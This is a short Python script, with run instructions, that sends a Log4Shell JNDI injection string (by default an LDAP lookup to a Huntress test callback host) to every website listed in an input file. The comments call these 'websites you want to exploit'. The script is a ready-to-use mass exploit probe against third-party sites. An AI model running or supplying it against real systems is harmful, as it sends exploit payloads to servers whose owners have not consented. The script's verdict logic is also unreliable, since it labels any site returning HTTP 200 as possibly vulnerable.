

### How to run

#pip install requests
#populate the list of websites you want to exploit in input.txt
#run python automate.py


import requests
f = open("input.txt")
s = input("Please input the needed jdni string from huntress.org\n(if nothing provided it will use default): ")

if (s==""):
    print("No input detected, going with default string")
    s  = "${jndi:ldap://log4shell.huntress.com:1389/c2b57aa8-1def-487d-bb0a-5fc736c50fd5}"

print("String primed for exploit: \n", s)
vuln_webs = []
for i in f.readlines():
    url = i.strip()+"/"+s
    print("Website checking: ", url)
    res = requests.get(url)
    if (res.status_code == 200):
        vuln_webs.append(i)

print("Possible vulnerable website found : ")
print(vuln_webs)
